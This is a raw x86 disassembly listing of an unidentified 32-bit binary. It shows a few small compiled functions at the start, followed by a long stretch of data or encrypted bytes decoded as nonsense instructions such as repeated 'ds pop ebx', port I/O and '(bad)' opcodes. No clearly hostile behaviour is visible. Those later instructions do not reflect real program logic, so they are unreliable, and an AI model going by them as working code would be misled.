  401aca:	mov    esp,ebp
  401acc:	pop    ebp
  401acd:	ret    
  401ace:	int3   
  401acf:	int3   
  401ad0:	push   ebp
  401ad1:	mov    ebp,esp
  401ad3:	sub    esp,0x18
  401ad6:	mov    eax,DWORD PTR [ebp+0x8]
  401ad9:	mov    DWORD PTR [ebp-0x8],eax
  401adc:	mov    ecx,DWORD PTR [ebp+0xc]
  401adf:	mov    DWORD PTR [ebp-0x4],ecx
  401ae2:	mov    DWORD PTR [ebp-0x10],0x19c
  401ae9:	mov    edx,DWORD PTR [ebp-0x8]
  401aec:	mov    DWORD PTR ds:0x4279b0,edx
  401af2:	mov    eax,DWORD PTR [ebp-0x4]
  401af5:	mov    ds:0x4279b4,eax
  401afa:	mov    ecx,DWORD PTR ds:0x4279b0
  401b00:	mov    DWORD PTR [ebp-0x14],ecx
  401b03:	mov    edx,DWORD PTR ds:0x4279b4
  401b09:	mov    DWORD PTR [ebp-0xc],edx
  401b0c:	mov    eax,DWORD PTR [ebp-0xc]
  401b0f:	mov    ecx,DWORD PTR [ebp-0x14]
  401b12:	lea    edx,[ecx+eax*2]
  401b15:	mov    DWORD PTR [ebp-0x18],edx
  401b18:	mov    eax,DWORD PTR [ebp-0x18]
  401b1b:	mov    DWORD PTR [ebp-0x14],eax
  401b1e:	mov    ecx,DWORD PTR [ebp-0x14]
  401b21:	movzx  edx,WORD PTR [ecx]
  401b24:	mov    DWORD PTR [ebp-0xc],edx
  401b27:	mov    eax,DWORD PTR [ebp-0xc]
  401b2a:	mov    esp,ebp
  401b2c:	pop    ebp
  401b2d:	ret    
  401b2e:	int3   
  401b2f:	int3   
  401b30:	push   ebp
  401b31:	mov    ebp,esp
  401b33:	sub    esp,0xc
  401b36:	mov    eax,DWORD PTR [ebp+0x8]
  401b39:	mov    DWORD PTR [ebp-0x8],eax
  401b3c:	mov    ecx,DWORD PTR [ebp+0xc]
  401b3f:	mov    DWORD PTR [ebp-0xc],ecx
  401b42:	mov    DWORD PTR [ebp-0x4],0x22b
  401b49:	mov    edx,DWORD PTR [ebp-0x8]
  401b4c:	cmp    edx,DWORD PTR [ebp-0xc]
  401b4f:	jae    0x401b5f
  401b51:	mov    DWORD PTR [ebp-0x4],0x22b
  401b58:	mov    eax,DWORD PTR [ebp-0x8]
  401b5b:	jmp    0x401b69
  401b5d:	jmp    0x401b69
  401b5f:	mov    DWORD PTR [ebp-0x4],0x22b
  401b66:	mov    eax,DWORD PTR [ebp-0xc]
  401b69:	mov    esp,ebp
  401b6b:	pop    ebp
  401b6c:	ret    
  401b6d:	int3   
  401b6e:	int3   
  401b6f:	int3   
  401b70:	push   ebp
  401b71:	mov    ebp,esp
  401b73:	sub    esp,0x8
  401b76:	mov    eax,DWORD PTR [ebp+0x8]
  401b79:	cmp    DWORD PTR [eax+0x4],0x0
  401b7d:	je     0x401bbb
  401b7f:	mov    ecx,DWORD PTR [ebp+0x8]
  401b82:	add    ecx,0x8
  401b85:	mov    DWORD PTR ds:0x4279a8,ecx
  401b8b:	mov    edx,DWORD PTR [ebp+0x8]
  401b8e:	mov    eax,DWORD PTR [edx+0x4]
  401b91:	mov    ds:0x4279a4,eax
  401b96:	call   0x401510
  401b9b:	mov    ecx,DWORD PTR [ebp+0x8]
  401b9e:	mov    DWORD PTR ds:0x427980,ecx
  401ba4:	mov    edx,DWORD PTR [ebp+0x10]
  401ba7:	push   edx
  401ba8:	mov    eax,DWORD PTR [ebp+0xc]
  401bab:	push   eax
  401bac:	push   0x1
  401bae:	call   0x401120
  401bb3:	add    esp,0xc
  401bb6:	mov    DWORD PTR [ebp+0x8],eax
  401bb9:	jmp    0x401b76
  401bbb:	mov    esp,ebp
  401bbd:	pop    ebp
  401bbe:	ret    
  401bbf:	int3   
	...
  402f48:	add    BYTE PTR [edx],al
  402f4a:	add    BYTE PTR [eax],al
  402f4c:	ds pop ebx
  402f4e:	add    BYTE PTR [eax],al
  402f50:	push   esi
  402f51:	pop    ebx
  402f52:	add    BYTE PTR [eax],al
  402f54:	ret    0x9069
  402f57:	xor    dl,dl
  402f59:	imul   ebx,DWORD PTR [eax-0x5f963dce],0xa869e232
  402f63:	xor    bh,BYTE PTR [esi]
  402f65:	cmp    eax,DWORD PTR [ecx]
  402f67:	add    BYTE PTR [edx+0x5b],bl
  402f6a:	add    BYTE PTR [eax],al
  402f6c:	pop    ebp
  402f6d:	mov    di,WORD PTR ds:0x3d9a66ce
  402f74:	shl    DWORD PTR [esi-0x58],1
  402f77:	cmp    eax,0x3dd36698
  402f7c:	and    BYTE PTR [esi-0x18],0x3d
  402f80:	inc    edx
  402f81:	gs sub eax,0x5165053e
  402f87:	ds out 0x64,eax
  402f8a:	fnstsw WORD PTR [esi]
  402f8c:	pop    edx
  402f8d:	add    BYTE PTR fs:[eax],al
  402f90:	sub    eax,DWORD PTR ds:[ecx]
  402f93:	add    BYTE PTR [esi],dl
  402f95:	pop    ebx
  402f96:	add    BYTE PTR [eax],al
  402f98:	add    DWORD PTR [ebx-0x33],ebp
  402f9b:	xor    BYTE PTR [ebx],cl
  402f9d:	imul   eax,DWORD PTR [ecx+esi*1],0x4b
  402fa1:	push   0x27
  402fa3:	xor    eax,edx
  402fa5:	imul   eax,ebx,0xe969e531
  402fab:	xor    DWORD PTR [ecx],edx
  402fad:	push   0xffffffff
  402faf:	xor    DWORD PTR [eax],eax
	...
  402fd9:	add    BYTE PTR [edx+0x69],cl
  402fdc:	adc    dh,BYTE PTR [edx]
  402fde:	sbb    BYTE PTR [ecx+0x31],ch
  402fe1:	xor    ah,BYTE PTR [edi]
  402fe3:	imul   edi,DWORD PTR [edi],0x58697b32
  402fe9:	xor    bh,bh
  402feb:	push   0x67b832c7
  402ff0:	mov    esi,DWORD PTR [ebx]
  402ff2:	stos   DWORD PTR es:[edi],eax
  402ff3:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  402ff5:	xor    ecx,DWORD PTR [esi-0x5dcc3299]
  402ffb:	addr16 jmp 0xf834:0x216f3c33
  403003:	outs   dx,BYTE PTR ds:[esi]
  403004:	push   edi
  403005:	xor    al,0x2
  403007:	outs   dx,DWORD PTR ds:[esi]
  403008:	arpl   WORD PTR [edi+edx*1],si
  40300b:	outs   dx,DWORD PTR ds:[esi]
  40300c:	xor    BYTE PTR [esi+eax*8],0x6e
  403010:	xchg   ecx,eax
  403011:	xor    al,0xb1
  403013:	outs   dx,BYTE PTR ds:[esi]
  403014:	sahf   
  403015:	xor    al,0xd3
  403017:	outs   dx,BYTE PTR ds:[esi]
  403018:	mov    ebp,0xd46e7c34
  40301d:	xor    al,0x93
  40301f:	outs   dx,BYTE PTR ds:[esi]
  403020:	out    0x34,eax
  403022:	jo     0x403092
  403024:	add    dh,BYTE PTR ds:0x35486e4e
  40302a:	or     BYTE PTR [esi+0x54],ch
  40302d:	xor    eax,0x356a6ddb
  403032:	mov    esp,0x7635be6d
  403037:	ins    DWORD PTR es:[edi],dx
  403038:	aad    0x35
  40303a:	pop    ds
  40303b:	imul   ebp,ebx,0x35
	...
  403065:	add    BYTE PTR [eax],al
  403067:	add    BYTE PTR [edx],ch
  403069:	imul   edi,esi,0xe693735
  40306f:	ss dec edx
  403071:	imul   ebx,DWORD PTR ds:0x34696936,0x3f695436
  40307b:	sub    DWORD PTR ss:[ecx+0x49],0x36
  403080:	jo     0x4030eb
  403082:	push   esp
  403083:	ss pop esp
  403085:	imul   ebp,DWORD PTR [eax+0x36],0x36726963
  40308c:	mov    ecx,0xf8369a69
  403091:	imul   ecx,esp,0xdc69ec36
  403097:	cmp    BYTE PTR ss:[edx+0x2b],ch
  40309b:	aaa    
  40309c:	push   es
  40309d:	push   0x4c
  40309f:	aaa    
  4030a0:	push   0x2737636a
  4030a5:	push   0x71
  4030a7:	aaa    
  4030a8:	aaa    
  4030a9:	push   0xffffff84
  4030ab:	aaa    
  4030ac:	mov    edx,0xdc379d6a
  4030b1:	push   0xffffffb1
  4030b3:	aaa    
  4030b4:	sub    DWORD PTR [edx-0x32],0x37
  4030b8:	push   0x3e37e56a
  4030bd:	pop    ebx
  4030be:	add    BYTE PTR [eax],al
  4030c0:	ds pop ebx
  4030c2:	add    BYTE PTR [eax],al
  4030c4:	ds pop ebx
  4030c6:	add    BYTE PTR [eax],al
  4030c8:	ds pop ebx
	...
  4030f6:	ds pop ebx
  4030f8:	add    BYTE PTR [eax],al
  4030fa:	ds pop ebx
  4030fc:	add    BYTE PTR [eax],al
  4030fe:	ds pop ebx
  403100:	add    BYTE PTR [eax],al
  403102:	ds pop ebx
  403104:	add    BYTE PTR [eax],al
  403106:	ds pop ebx
  403108:	add    BYTE PTR [eax],al
  40310a:	ds pop ebx
  40310c:	add    BYTE PTR [eax],al
  40310e:	ds pop ebx
  403110:	add    BYTE PTR [eax],al
  403112:	ds pop ebx
  403114:	add    BYTE PTR [eax],al
  403116:	ds pop ebx
  403118:	add    BYTE PTR [eax],al
  40311a:	ds pop ebx
  40311c:	add    BYTE PTR [eax],al
  40311e:	ds pop ebx
  403120:	add    BYTE PTR [eax],al
  403122:	ds pop ebx
  403124:	add    BYTE PTR [eax],al
  403126:	ds pop ebx
  403128:	add    BYTE PTR [eax],al
  40312a:	ds pop ebx
  40312c:	add    BYTE PTR [eax],al
  40312e:	ds pop ebx
  403130:	add    BYTE PTR [eax],al
  403132:	ds pop ebx
  403134:	add    BYTE PTR [eax],al
  403136:	ds pop ebx
  403138:	add    BYTE PTR [eax],al
  40313a:	ds pop ebx
  40313c:	add    BYTE PTR [eax],al
  40313e:	ds pop ebx
  403140:	add    BYTE PTR [eax],al
  403142:	ds pop ebx
  403144:	add    BYTE PTR [eax],al
  403146:	ds pop ebx
  403148:	add    BYTE PTR [eax],al
  40314a:	ds pop ebx
  40314c:	add    BYTE PTR [eax],al
  40314e:	ds pop ebx
  403150:	add    BYTE PTR [eax],al
  403152:	ds pop ebx
  403154:	add    BYTE PTR [eax],al
  403156:	ds pop ebx
	...
  403184:	ds pop ebx
  403186:	add    BYTE PTR [eax],al
  403188:	ds pop ebx
  40318a:	add    BYTE PTR [eax],al
  40318c:	ds pop ebx
  40318e:	add    BYTE PTR [eax],al
  403190:	ds pop ebx
  403192:	add    BYTE PTR [eax],al
  403194:	ds pop ebx
  403196:	add    BYTE PTR [eax],al
  403198:	ds pop ebx
  40319a:	add    BYTE PTR [eax],al
  40319c:	ds pop ebx
  40319e:	add    BYTE PTR [eax],al
  4031a0:	ds pop ebx
  4031a2:	add    BYTE PTR [eax],al
  4031a4:	ds pop ebx
  4031a6:	add    BYTE PTR [eax],al
  4031a8:	ds pop ebx
  4031aa:	add    BYTE PTR [eax],al
  4031ac:	ds pop ebx
  4031ae:	add    BYTE PTR [eax],al
  4031b0:	ds pop ebx
  4031b2:	add    BYTE PTR [eax],al
  4031b4:	ds pop ebx
  4031b6:	add    BYTE PTR [eax],al
  4031b8:	ds pop ebx
  4031ba:	add    BYTE PTR [eax],al
  4031bc:	ds pop ebx
  4031be:	add    BYTE PTR [eax],al
  4031c0:	ds pop ebx
  4031c2:	add    BYTE PTR [eax],al
  4031c4:	ds pop ebx
  4031c6:	add    BYTE PTR [eax],al
  4031c8:	ds pop ebx
  4031ca:	add    BYTE PTR [eax],al
  4031cc:	ds pop ebx
  4031ce:	add    BYTE PTR [eax],al
  4031d0:	ds pop ebx
  4031d2:	add    BYTE PTR [eax],al
  4031d4:	ds pop ebx
  4031d6:	add    BYTE PTR [eax],al
  4031d8:	ds pop ebx
  4031da:	add    BYTE PTR [eax],al
  4031dc:	ds pop ebx
  4031de:	add    BYTE PTR [eax],al
  4031e0:	ds pop ebx
  4031e2:	add    BYTE PTR [eax],al
  4031e4:	ds pop ebx
	...
  403212:	ds pop ebx
  403214:	add    BYTE PTR [eax],al
  403216:	ds pop ebx
  403218:	add    BYTE PTR [eax],al
  40321a:	ds pop ebx
  40321c:	add    BYTE PTR [eax],al
  40321e:	add    BYTE PTR [edi+0x1],dh
  403221:	add    BYTE PTR [esi],bh
  403223:	and    al,BYTE PTR [ecx+0x0]
  403226:	add    DWORD PTR [esi],edi
  403228:	je     0x40327a
  40322a:	sub    al,0x34
  40322c:	arpl   WORD PTR [ecx+0x22],ax
  40322f:	aas    
  403230:	jb     0x403297
  403232:	sub    eax,0xa000028
  403237:	xor    al,0x61
  403239:	add    dh,BYTE PTR fs:[edx]
  40323c:	bound  esi,QWORD PTR [edx+0x1f]
  40323f:	sub    DWORD PTR [ecx+0x45],edi
  403242:	push   es
  403243:	sbb    al,BYTE PTR [eax]
  403245:	add    BYTE PTR [edx],cl
  403247:	xor    al,0x61
  403249:	add    dh,BYTE PTR fs:[edx]
  40324c:	bound  esi,QWORD PTR [edx-0x21]
  40324f:	sub    BYTE PTR [ecx+0x45],bh
  403252:	out    0xb,al
  403254:	add    BYTE PTR [eax],al
  403256:	add    DWORD PTR [esi],edi
  403258:	je     0x4032a7
  40325a:	loope  0x40329a
  40325c:	jne    0x4032ca
  40325e:	jecxz  0x403272
  403260:	popa   
  403261:	outs   dx,BYTE PTR ds:[esi]
  403262:	fidiv  DWORD PTR [esi]
  403264:	gs inc ecx
  403266:	ds pop ebx
  403268:	add    BYTE PTR [eax],al
  40326a:	jge    0x403295
  40326c:	gs popa 
  40326e:	mov    dl,0x3e
  403270:	inc    esi
  403271:	imul   edx,DWORD PTR [edx-0x55ffbec2],0x9d727428
  40327b:	cmp    dh,BYTE PTR [ecx+eax*2+0x3e]
  40327f:	pop    ebx
  403280:	add    BYTE PTR [eax],al
  403282:	jns    0x4032c2
  403284:	je     0x4032dd
	...
  4032ae:	add    BYTE PTR [eax],al
  4032b0:	addr16 xor eax,0x28696f64
  4032b6:	inc    esp
  4032b7:	imul   ebp,DWORD PTR [esi+edi*1+0x63],0x79295174
  4032bf:	inc    ecx
  4032c0:	ds pop ebx
  4032c2:	add    BYTE PTR [eax],al
  4032c4:	jns    0x403304
  4032c6:	je     0x403315
  4032c8:	pop    ecx
  4032c9:	aas    
  4032ca:	jne    0x403338
  4032cc:	pop    ebx
  4032cd:	adc    esp,DWORD PTR [ecx+0x6e]
  4032d0:	and    dh,BYTE PTR [edi]
  4032d2:	gs push edi
  4032d4:	ds pop ebx
  4032d6:	add    BYTE PTR [eax],al
  4032d8:	inc    edx
  4032d9:	pop    ecx
  4032da:	inc    eax
  4032db:	add    BYTE PTR [edx+0x59],cl
  4032de:	inc    eax
  4032df:	add    BYTE PTR [edx+0x59],ah
  4032e2:	inc    eax
  4032e3:	add    BYTE PTR [edx+0x59],cl
  4032e6:	inc    eax
  4032e7:	add    dh,dh
  4032e9:	pop    eax
  4032ea:	inc    eax
  4032eb:	add    dl,ch
  4032ed:	pop    eax
  4032ee:	inc    eax
  4032ef:	add    dh,bl
  4032f1:	pop    eax
  4032f2:	inc    eax
  4032f3:	add    dh,dh
  4032f5:	pop    eax
  4032f6:	inc    eax
  4032f7:	add    BYTE PTR [ecx],al
  4032f9:	ds je  0x40334c
  4032fc:	in     al,dx
  4032fd:	xor    esp,DWORD PTR [ebx+0x41]
  403300:	loop   0x403340
  403302:	jb     0x403369
  403304:	int    0x27
  403306:	add    BYTE PTR [eax],al
  403308:	cli    
  403309:	xor    esp,DWORD PTR [ecx+0x64]
  40330c:	repnz xor DWORD PTR [edx+0x72],esp
  403310:	lahf   
  403311:	sub    eax,0x4579
	...
  40333e:	mov    dh,0x1c
  403340:	add    BYTE PTR [eax],al
  403342:	xchg   ebp,eax
  403343:	cmp    BYTE PTR [edx+0x6e],dh
  403346:	fwait
  403347:	das    
  403348:	xor    esi,DWORD PTR [edx]
  40334a:	push   0x3e6c6c37
  40334f:	pop    ebx
  403350:	add    BYTE PTR [eax],al
  403352:	fwait
  403353:	cs jbe 0x4033b9
  403356:	mov    WORD PTR [edi],fs
  403358:	cs fs push 0x2f
  40335c:	add    BYTE PTR [eax],al
  40335e:	arpl   WORD PTR [eax],di
  403360:	ins    DWORD PTR es:[edi],dx
  403361:	jae    0x4033c6
  403363:	daa    
  403364:	add    BYTE PTR [eax],al
  403366:	push   ebx
  403367:	cs jbe 0x4033cd
  40336a:	dec    esp
  40336b:	daa    
  40336c:	cs bound ebp,QWORD PTR fs:[edi]
  403370:	add    BYTE PTR [eax],al
  403372:	pop    ebx
  403373:	cmp    BYTE PTR [ebp+0x63],ch
  403376:	dec    esi
  403377:	and    al,0x0
  403379:	add    BYTE PTR [eax],dl
  40337b:	xor    al,0x72
  40337d:	je     0x4033aa
  40337f:	cmp    al,0x6c
  403381:	inc    ecx
  403382:	sbb    ch,BYTE PTR [edi]
  403384:	outs   dx,DWORD PTR ds:[esi]
  403385:	arpl   WORD PTR [esi],di
  403387:	pop    ebx
  403388:	add    BYTE PTR [eax],al
  40338a:	lock xor esi,DWORD PTR [edx+0x74]
  40338e:	or     edi,DWORD PTR [esp+ebp*2]
  403391:	inc    ecx
  403392:	sbb    ch,BYTE PTR [edi]
  403394:	outs   dx,DWORD PTR ds:[esi]
  403395:	arpl   WORD PTR [esi],di
  403397:	pop    ebx
  403398:	add    BYTE PTR [eax],al
  40339a:	adc    esi,DWORD PTR [ecx]
  40339c:	ins    DWORD PTR es:[edi],dx
  40339d:	popa   
  40339e:	out    dx,al
  40339f:	or     BYTE PTR [ecx+0x65],ch
	...
  4033ca:	add    BYTE PTR [eax],al
  4033cc:	icebp  
  4033cd:	adc    DWORD PTR [esi+0x46],esp
  4033d0:	xlat   BYTE PTR ds:[ebx]
  4033d1:	cs gs add al,dh
  4033d5:	xor    esi,DWORD PTR [edx+0x74]
  4033d8:	retf   
  4033d9:	cmp    ebp,DWORD PTR [eax+edx*2-0x34]
  4033dd:	xor    DWORD PTR [ebp+eiz*2-0x23],esi
  4033e1:	add    BYTE PTR es:[eax],al
  4033e4:	xchg   BYTE PTR [eax],bh
  4033e6:	popa   
  4033e7:	jo     0x403468
  4033e9:	das    
  4033ea:	ins    BYTE PTR es:[edi],dx
  4033eb:	outs   dx,DWORD PTR ds:[esi]
  4033ec:	popf   
  4033ed:	pop    ebx
  4033ee:	add    BYTE PTR [eax],al
  4033f0:	xchg   ebp,eax
  4033f1:	cmp    BYTE PTR [edx+0x6e],dh
  4033f4:	mov    ds:0x6032332f,eax
  4033f9:	aaa    
  4033fa:	ins    BYTE PTR es:[edi],dx
  4033fb:	ins    BYTE PTR es:[edi],dx
  4033fc:	ds pop ebx
  4033fe:	add    BYTE PTR [eax],al
  403400:	jns    0x40343a
  403402:	je     0x403454
  403404:	ins    BYTE PTR es:[edi],dx
  403405:	xor    ah,BYTE PTR [ebx+0x65]
  403408:	ins    DWORD PTR es:[edi],dx
  403409:	cs dec eax
  40340b:	gs pop edi
  40340d:	sub    eax,DWORD PTR [eax]
  40340f:	add    BYTE PTR [esi],bh
  403411:	pop    ebx
  403412:	add    WORD PTR [esi],di
  403415:	neg    DWORD PTR [ecx-0x70]
  403418:	ds mov ch,0x3
  40341b:	add    BYTE PTR [esi],bh
  40341d:	mov    al,0x3
  40341f:	add    BYTE PTR [esi],bh
  403421:	mov    eax,ds:0x6c3e00fb
  403426:	add    eax,DWORD PTR [eax]
  403428:	ds mov ah,0x3
  40342b:	add    BYTE PTR [esi],bh
  40342d:	je     0x403433
	...
  403457:	add    BYTE PTR [eax],al
  403459:	add    BYTE PTR [esi],bh
  40345b:	mov    ah,0x3
  40345d:	add    BYTE PTR [esi],bh
  40345f:	mov    ah,0x3
  403461:	add    BYTE PTR [esi],bh
  403463:	mov    ah,0x3
  403465:	add    BYTE PTR [esi],bh
  403467:	mov    ah,0x3
  403469:	add    BYTE PTR [esi],bh
  40346b:	mov    ah,0x3
  40346d:	add    BYTE PTR [esi],bh
  40346f:	mov    ah,0x3
  403471:	add    BYTE PTR [esi],bh
  403473:	mov    ah,0x3
  403475:	add    BYTE PTR [esi],bh
  403477:	mov    ah,0x3
  403479:	add    BYTE PTR [esi],bh
  40347b:	xor    al,0x4
  40347d:	add    BYTE PTR [esi],bh
  40347f:	mov    edx,0xb440ba1a
  403484:	scas   eax,DWORD PTR es:[edi]
  403485:	or     DWORD PTR [ebx-0x6e],edi
  403488:	mov    ebx,0x25eef201
  40348d:	push   esp
  40348e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40348f:	pop    ebx
  403490:	ja     0x4034b2
  403492:	scas   al,BYTE PTR es:[edi]
  403493:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403494:	push   0x67
  403496:	lods   al,BYTE PTR ds:[esi]
  403497:	xchg   ebx,eax
  403498:	push   0x69939d20
  40349d:	outs   dx,BYTE PTR ds:[esi]
  40349e:	test   eax,0x9b62237e
  4034a3:	push   edx
  4034a4:	jbe    0x40351b
  4034a6:	cwde   
  4034a7:	push   edx
  4034a8:	ins    DWORD PTR es:[edi],dx
  4034a9:	outs   dx,BYTE PTR ds:[esi]
  4034aa:	pop    esi
  4034ab:	test   BYTE PTR [edx+0x53],0x1e
  4034af:	xchg   edi,eax
  4034b0:	push   0x64
  4034b2:	pop    ebx
  4034b3:	mov    al,ds:0x5b340d08
  4034b8:	int    0x3
  4034ba:	ds pop ebx
  4034bc:	jmp    0x4034c4
	...
  4034e5:	add    BYTE PTR [eax],al
  4034e7:	add    BYTE PTR [esi],bh
  4034e9:	pop    ebx
  4034ea:	mov    ecx,0x9d5b3e40
  4034ef:	add    al,0x3d
  4034f1:	pop    ebx
  4034f2:	inc    esi
  4034f3:	pop    ss
  4034f4:	rcl    BYTE PTR [eax],0xe9
  4034f7:	add    edi,DWORD PTR [esi]
  4034f9:	pop    ebx
  4034fa:	jmp    0x99b7302
  4034ff:	add    al,0x39
  403501:	pop    edx
  403502:	repnz add al,0x3c
  403505:	ins    DWORD PTR es:[edi],dx
  403506:	jmp    0xe99b7426
  40350b:	push   ebp
  40350c:	ds pop ebx
  40350e:	jmp    0x109b7316
  403513:	pop    es
  403514:	aas    
  403515:	pop    ebx
  403516:	jmp    0xe99b732e
  40351b:	xor    edi,DWORD PTR [edi]
  40351d:	pop    ebx
  40351e:	jmp    0xe99b3326
  403523:	adc    edi,DWORD PTR [esi]
  403525:	pop    ebx
  403526:	jmp    0xed9b7330
  40352b:	add    edi,DWORD PTR [esi]
  40352d:	pop    ebx
  40352e:	jmp    0xed9b7336
  403533:	add    edi,DWORD PTR [esi]
  403535:	pop    ebx
  403536:	jmp    0xe99b733e
  40353b:	xchg   ebx,eax
  40353c:	aas    
  40353d:	pop    ebx
  40353e:	jmp    0xc79b7348
  403543:	ins    BYTE PTR es:[edi],dx
  403544:	aas    
  403545:	pop    ebx
  403546:	jmp    0x40354b
  403548:	ds pop ebx
  40354a:	jmp    0x403552
	...
  403573:	add    BYTE PTR [eax],al
  403575:	add    BYTE PTR [esi],ch
  403577:	pop    ebx
  403578:	jmp    0xe99b7390
  40357d:	add    ebp,DWORD PTR [esi]
  40357f:	pop    ebx
  403580:	jmp    0x9b7398
  403585:	jmp    0xd94090c7
  40358a:	cmp    eax,0x3de9005b
  40358f:	pop    ebx
  403590:	add    cl,ch
  403592:	cmp    eax,0x5739005b
  403597:	pop    edx
  403598:	add    BYTE PTR [ecx],ah
  40359a:	cmp    eax,0x3de9005b
  40359f:	pop    ebx
  4035a0:	add    cl,ch
  4035a2:	cmp    eax,0x3de9005b
  4035a7:	pop    ebx
  4035a8:	add    cl,ch
  4035aa:	cmp    eax,0x3de9005b
  4035af:	pop    ebx
  4035b0:	add    cl,ch
  4035b2:	cmp    eax,0x3de9005b
  4035b7:	pop    ebx
  4035b8:	add    cl,ch
  4035ba:	cmp    eax,0x3de9005b
  4035bf:	pop    ebx
  4035c0:	add    cl,ch
  4035c2:	cmp    eax,0x3de9005b
  4035c7:	pop    ebx
  4035c8:	add    cl,ch
  4035ca:	cmp    eax,0x3de9005b
  4035cf:	pop    ebx
  4035d0:	add    cl,ch
  4035d2:	cmp    eax,0x3de9005b
  4035d7:	pop    ebx
  4035d8:	add    cl,ch
	...
  403602:	add    BYTE PTR [eax],al
  403604:	cmp    eax,0x3de9005b
  403609:	pop    ebx
  40360a:	add    cl,ch
  40360c:	cmp    eax,0x3de9005b
  403611:	pop    ebx
  403612:	add    cl,ch
  403614:	cmp    eax,0xbd11005b
  403619:	pop    esp
  40361a:	add    BYTE PTR [ecx+0x3d],bh
  40361d:	pop    ebx
  40361e:	add    cl,ch
  403620:	cmp    eax,0x3de9005b
  403625:	pop    ebx
  403626:	add    BYTE PTR [eax],al
  403628:	pop    ss
  403629:	pop    ebx
  40362a:	add    BYTE PTR [eax],al
  40362c:	out    0x5a,eax
  40362e:	add    BYTE PTR [eax],al
  403630:	out    0x5a,eax
  403632:	add    BYTE PTR [eax],al
  403634:	xlat   BYTE PTR ds:[ebx]
  403635:	pop    edx
  403636:	add    BYTE PTR [eax],al
  403638:	or     DWORD PTR [edi],ebp
  40363a:	gs js  0x4035f0
  40363d:	pop    edx
  40363e:	add    BYTE PTR [eax],al
  403640:	pushf  
  403641:	dec    ebx
  403642:	add    DWORD PTR [eax],eax
  403644:	xlat   BYTE PTR ds:[ebx]
  403645:	dec    edx
  403646:	add    BYTE PTR [eax],al
  403648:	xlat   BYTE PTR ds:[ebx]
  403649:	inc    edx
  40364a:	add    DWORD PTR [eax],eax
  40364c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40364d:	pop    eax
  40364e:	add    BYTE PTR [eax],al
  403650:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403651:	pop    edx
  403652:	add    BYTE PTR [eax],al
  403654:	xchg   edi,eax
  403655:	pop    edx
  403656:	add    BYTE PTR [eax],al
  403658:	xchg   edi,eax
  403659:	pop    edx
  40365a:	add    BYTE PTR [eax],al
  40365c:	inc    edi
  40365d:	push   edi
  40365e:	add    BYTE PTR [eax+0x39],ah
  403661:	and    eax,0x39f36164
	...
  403692:	xchg   edi,eax
  403693:	pop    ecx
  403694:	add    BYTE PTR [eax],al
  403696:	addr16 push 0x1
  403699:	add    BYTE PTR [edi+0x58],ah
  40369c:	add    BYTE PTR [eax],al
  40369e:	push   edi
  40369f:	inc    eax
  4036a0:	add    DWORD PTR [eax],eax
  4036a2:	push   edi
  4036a3:	pop    edx
  4036a4:	add    BYTE PTR [eax],al
  4036a6:	addr16 pop edx
  4036a8:	add    BYTE PTR [eax],al
  4036aa:	addr16 pop edx
  4036ac:	add    BYTE PTR [eax],al
  4036ae:	pop    ss
  4036af:	push   edi
  4036b0:	add    BYTE PTR [eax+0x69],al
  4036b3:	(bad)  
  4036b4:	pusha  
  4036b5:	je     0x4036fd
  4036b7:	push   edi
  4036b8:	add    BYTE PTR [eax],al
  4036ba:	lahf   
  4036bb:	adc    al,0x0
  4036bd:	add    BYTE PTR [edi],dl
  4036bf:	sbb    al,BYTE PTR [ecx]
  4036c1:	add    BYTE PTR [edi],dl
  4036c3:	adc    BYTE PTR [eax],al
  4036c5:	add    BYTE PTR [edi],ah
  4036c7:	inc    esi
  4036c8:	add    DWORD PTR [eax],eax
  4036ca:	ds mov ah,0x3
  4036cd:	add    BYTE PTR [esi],bh
  4036cf:	mov    ah,0x3
  4036d1:	add    BYTE PTR [esi],bh
  4036d3:	mov    ah,0x3
  4036d5:	add    BYTE PTR [esi],bh
  4036d7:	hlt    
  4036d8:	add    eax,DWORD PTR [eax]
  4036da:	(bad)  
  4036db:	mov    bl,0x3
  4036dd:	add    BYTE PTR [esi],bh
  4036df:	mov    ah,0x3
  4036e1:	add    BYTE PTR [esi],bh
  4036e3:	mov    ah,0x3
  4036e5:	add    BYTE PTR [esi],bh
  4036e7:	mov    ah,0x3
  4036e9:	add    BYTE PTR [esi],bh
  4036eb:	fisttp WORD PTR [esp+ebp*8+0xf6bec6e]
  4036f2:	cs hlt 
  4036f4:	add    edi,eax
	...
  40371e:	add    BYTE PTR [eax],al
  403720:	sub    al,0xb3
  403722:	(bad)  
  403723:	push   DWORD PTR [ecx+0x3f6a0b1e]
  403729:	fiadd  DWORD PTR [ebx]
  40372b:	call   0x44b755
  403730:	xchg   ecx,esi
  403732:	add    BYTE PTR [eax],al
  403734:	jmp    0x40376e
  403736:	call   0x265c1d8b
  40373b:	adc    dh,bh
  40373d:	mov    bl,0xfb
  40373f:	jb     0x403780
  403741:	icebp  
  403742:	test   DWORD PTR [ebx+0x7403bbf3],0x8513935
  40374c:	mov    ch,0xa1
  40374e:	div    BYTE PTR [ebp+0x46]
  403751:	mov    ebp,0xf1870852
  403756:	add    BYTE PTR [eax],al
  403758:	repz cmp al,ch
  40375b:	cmp    DWORD PTR [edx-0x25],0x54
  40375f:	pop    eax
  403760:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403761:	inc    edi
  403762:	adc    al,0x40
  403764:	sub    dh,BYTE PTR ds:[edx+0x1]
  403768:	std    
  403769:	sub    eax,0x5b3275f7
  40376e:	jbe    0x4037b1
  403770:	push   ss
  403771:	xchg   ebp,eax
  403772:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403773:	idiv   DWORD PTR [esi]
  403775:	pop    ebx
  403776:	jmp    0xe146ec7e
  40377b:	mov    ch,BYTE PTR [ecx+esi*1]
  40377e:	jmp    0x3e8bab79
  403783:	jno    0x403785
	...
  4037ad:	add    dl,dh
  4037af:	pushf  
  4037b0:	mov    esp,0xe126e9fb
  4037b5:	test   BYTE PTR [edi+eax*2+0x5b4ac230],0xb4
  4037bd:	mov    ah,dl
  4037bf:	fsubr  DWORD PTR ds:0x81036efc
  4037c5:	test   DWORD PTR [esi],ebp
  4037c7:	sbb    ebp,ecx
  4037c9:	sti    
  4037ca:	sub    al,0x5a
  4037cc:	sub    dh,bh
  4037ce:	jns    0x4037e6
  4037d0:	icebp  
